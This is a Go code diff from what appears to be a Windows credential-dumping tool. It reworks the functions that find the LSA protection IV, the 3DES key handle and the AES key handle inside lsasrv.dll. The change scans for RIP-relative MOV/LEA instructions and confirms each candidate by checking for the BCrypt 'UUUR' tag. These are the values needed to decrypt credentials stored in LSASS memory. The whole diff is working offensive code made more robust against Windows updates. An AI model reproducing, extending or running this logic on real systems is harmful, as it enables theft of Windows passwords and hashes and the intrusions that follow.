@@ -170,17 +170,13 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 	aesOff, _, aesOk := resolveRIPRelative(lsasrvBytes, hit+layout.HAesKeyMovStart, layout.MovDispOffset, layout.MovInstrLen)
 
 	if !ivOk || !desOk || !aesOk {
-		// Hardcoded offsets failed — fall back to scanning for RIP-relative
-		// MOV/LEA instructions near the pattern. Windows patches can shift
-		// the code layout, invalidating the static offsets.
-		scanIV, scanDES, scanAES, scanErr := scanCryptoGlobals(lsasrvBytes, hit, len(pat))
+		// Try scanning for MOV/LEA instructions near the pattern
+		scanResult, scanErr := scanCryptoGlobals(lsasrvBytes, lsasrvBase, hit, len(pat))
 		if scanErr != nil {
-			return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory %q: hardcoded offsets failed (iv=%v des=%v aes=%v) and dynamic scan also failed: %w",
-				layout.Name, ivOk, desOk, aesOk, scanErr)
+			return lsaCryptoGlobals{}, fmt.Errorf("LsaInitializeProtectedMemory %q: hardcoded offsets failed (iv=%v des=%v aes=%v at hit=%d) and scan failed: %w",
+				layout.Name, ivOk, desOk, aesOk, hit, scanErr)
 		}
-		ivOff = scanIV
-		desOff = scanDES
-		aesOff = scanAES
+		return scanResult, nil
 	}
 
 	return lsaCryptoGlobals{
@@ -192,19 +188,15 @@ func findLsaCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryp
 
 // scanCryptoGlobals dynamically finds the three crypto global references near
 // a LsaInitializeProtectedMemory pattern match. It scans for RIP-relative
-// MOV/LEA instructions (REX.W + 8B/8D + ModRM with mod=00,r/m=101) both
-// before and after the pattern hit.
-//
-// The function relies on the invariant that exactly one LEA (for IV) appears
-// after the pattern, and the two closest MOV instructions before the pattern
-// reference h3DesKey (closer) and hAesKey (further).
-func scanCryptoGlobals(lsasrvBytes []byte, hit, patLen int) (ivOff, desOff, aesOff int, err error) {
+// MOV/LEA instructions and validates candidates by checking for the BCrypt
+// 'UUUR' handle tag in the module's data section.
+func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int) (lsaCryptoGlobals, error) {
 	bufLen := len(lsasrvBytes)
 
-	// Scan forward from the pattern for LEA with RIP-relative (IV).
-	// The IV LEA is typically the last bytes of or immediately after the pattern.
+	// Scan forward from the pattern for the IV LEA instruction.
+	var ivOff int
 	ivFound := false
-	fwdStart := hit + patLen - 7 // the LEA might overlap with the pattern tail
+	fwdStart := hit + patLen - 7
 	if fwdStart < hit {
 		fwdStart = hit
 	}
@@ -221,17 +213,20 @@ func scanCryptoGlobals(lsasrvBytes []byte, hit, patLen int) (ivOff, desOff, aesO
 		break
 	}
 	if !ivFound {
-		return 0, 0, 0, fmt.Errorf("no RIP-relative LEA/MOV found within 50 bytes after pattern at offset %d", hit)
+		return lsaCryptoGlobals{}, fmt.Errorf("no RIP-relative LEA/MOV found within 50 bytes after pattern at offset %d", hit)
 	}
 
-	// Scan backward from the pattern for MOV [RIP+disp32] instructions.
-	// Collect all candidates whose targets fall within the module.
-	type candidate struct {
-		instrOff int
-		target   int
+	// Scan backward from the pattern for RIP-relative instructions whose
+	// targets point to BCrypt handle globals. We validate by reading the
+	// pointer at the target offset, then checking if the pointed-to offset
+	// (also within the module image) has the 'UUUR' BCrypt handle tag.
+	type validatedKey struct {
+		instrOff  int
+		targetOff int // offset of the global variable in lsasrv.dll
 	}
-	var movCandidates []candidate
-	scanStart := hit - 200
+	var keyGlobals []validatedKey
+	seen := make(map[int]bool)
+	scanStart := hit - 300
 	if scanStart < 0 {
 		scanStart = 0
 	}
@@ -240,27 +235,51 @@ func scanCryptoGlobals(lsasrvBytes []byte, hit, patLen int) (ivOff, desOff, aesO
 			continue
 		}
 		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
-		if !ok || target < 0 || target >= bufLen {
+		if !ok || target < 0 || target+8 > bufLen {
 			continue
 		}
-		// Filter: target should be in the data section (high offsets, past .text)
-		// Heuristic: target > half the module size (data sections are at the end)
-		if target > bufLen/2 {
-			movCandidates = append(movCandidates, candidate{off, target})
+		if seen[target] {
+			continue
 		}
-		if len(movCandidates) >= 2 {
+		seen[target] = true
+
+		// Read the pointer stored at the global variable
+		ptr := binary.LittleEndian.Uint64(lsasrvBytes[target : target+8])
+		if ptr == 0 {
+			continue
+		}
+
+		// Convert virtual address to module offset
+		handleVA := uintptr(ptr)
+		if handleVA < lsasrvBase || handleVA >= lsasrvBase+uintptr(bufLen) {
+			continue
+		}
+		handleOff := int(handleVA - lsasrvBase)
+		if handleOff+bcryptHandleKeySize > bufLen {
+			continue
+		}
+
+		// Check for 'UUUR' tag at +4 in the BCrypt handle
+		tag := binary.LittleEndian.Uint32(lsasrvBytes[handleOff+bcryptHandleKeyTagOff : handleOff+bcryptHandleKeyTagOff+4])
+		if tag != bcryptHandleKeyTagWant {
+			continue
+		}
+
+		keyGlobals = append(keyGlobals, validatedKey{off, target})
+		if len(keyGlobals) >= 2 {
 			break
 		}
 	}
-	if len(movCandidates) < 2 {
-		return 0, 0, 0, fmt.Errorf("found %d RIP-relative MOV candidates (need 2) scanning 200 bytes before pattern at offset %d", len(movCandidates), hit)
+
+	if len(keyGlobals) < 2 {
+		return lsaCryptoGlobals{}, fmt.Errorf("found %d BCrypt-tag-validated key globals (need 2) scanning 300 bytes before pattern at offset %d", len(keyGlobals), hit)
 	}
 
-	// Closest to pattern = h3DesKey, next = hAesKey
-	desOff = movCandidates[0].target
-	aesOff = movCandidates[1].target
-
-	return ivOff, desOff, aesOff, nil
+	return lsaCryptoGlobals{
+		IVAddr:       lsasrvBase + uintptr(ivOff),
+		H3DesKeyAddr: lsasrvBase + uintptr(keyGlobals[0].targetOff),
+		HAesKeyAddr:  lsasrvBase + uintptr(keyGlobals[1].targetOff),
+	}, nil
 }
 
 // isRIPRelativeMOVorLEA checks if the 3 bytes at `off` in `buf` form the
